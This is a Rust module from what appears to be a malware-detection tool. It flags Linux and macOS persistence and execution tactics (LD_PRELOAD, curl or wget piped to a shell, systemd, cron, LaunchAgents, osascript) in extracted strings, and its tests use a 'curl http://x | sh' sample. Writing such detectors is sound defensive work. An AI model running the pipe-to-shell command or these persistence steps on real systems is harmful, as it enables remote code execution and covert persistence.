//! Conservative Linux/macOS tactic matching from extracted strings.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum PlatformTactic {
    LinuxPreloadPersistence,
    LinuxShellPipeExecution,
    LinuxSystemdPersistence,
    LinuxCronPersistence,
    MacLaunchAgentPersistence,
    MacOsascriptExecution,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct PlatformFinding {
    pub tactic: PlatformTactic,
    pub confidence: f64,
    pub evidence: Vec<String>,
}

fn has(strings: &[String], needle: &str) -> bool {
    strings.iter().any(|value| value.to_ascii_lowercase().contains(needle))
}

/// Match platform tactics only when a string set contains an executable
/// action plus the platform-specific persistence/loader context.
pub fn detect_platform_tactics(strings: &[String]) -> Vec<PlatformFinding> {
    let mut findings = Vec::new();
    if has(strings, "ld_preload") && (has(strings, "/etc/ld.so.preload") || has(strings, "export ld_preload")) {
        findings.push(PlatformFinding {
            tactic: PlatformTactic::LinuxPreloadPersistence,
            confidence: 0.82,
            evidence: vec!["LD_PRELOAD".into(), "/etc/ld.so.preload or export context".into()],
        });
    }
    if (has(strings, "curl ") || has(strings, "wget ")) && (has(strings, "| sh") || has(strings, "| bash")) {
        findings.push(PlatformFinding {
            tactic: PlatformTactic::LinuxShellPipeExecution,
            confidence: 0.78,
            evidence: vec!["network downloader".into(), "pipe to shell".into()],
        });
    }
    if has(strings, "systemctl enable") && (has(strings, ".service") || has(strings, "/etc/systemd")) {
        findings.push(PlatformFinding {
            tactic: PlatformTactic::LinuxSystemdPersistence,
            confidence: 0.75,
            evidence: vec!["systemctl enable".into(), "service unit path".into()],
        });
    }
    if has(strings, "crontab") && (has(strings, " -e") || has(strings, "/etc/cron")) {
        findings.push(PlatformFinding {
            tactic: PlatformTactic::LinuxCronPersistence,
            confidence: 0.68,
            evidence: vec!["crontab".into(), "cron write context".into()],
        });
    }
    if (has(strings, "launchagents") || has(strings, "launchdaemons"))
        && (has(strings, ".plist") || has(strings, "launchctl load"))
    {
        findings.push(PlatformFinding {
            tactic: PlatformTactic::MacLaunchAgentPersistence,
            confidence: 0.8,
            evidence: vec!["LaunchAgents/LaunchDaemons".into(), "plist or launchctl load".into()],
        });
    }
    if has(strings, "osascript") && (has(strings, "-e") || has(strings, "do shell script")) {
        findings.push(PlatformFinding {
            tactic: PlatformTactic::MacOsascriptExecution,
            confidence: 0.62,
            evidence: vec!["osascript".into(), "script execution argument".into()],
        });
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    fn strings(values: &[&str]) -> Vec<String> { values.iter().map(|v| (*v).into()).collect() }

    #[test]
    fn requires_context_for_linux_rules() {
        assert!(detect_platform_tactics(&strings(&["curl", "wget"])).is_empty());
        assert_eq!(detect_platform_tactics(&strings(&["curl http://x | sh"]))[0].tactic, PlatformTactic::LinuxShellPipeExecution);
    }

    #[test]
    fn detects_macos_launch_persistence() {
        let findings = detect_platform_tactics(&strings(&["~/Library/LaunchAgents", "agent.plist", "launchctl load"]));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].tactic, PlatformTactic::MacLaunchAgentPersistence);
    }
}
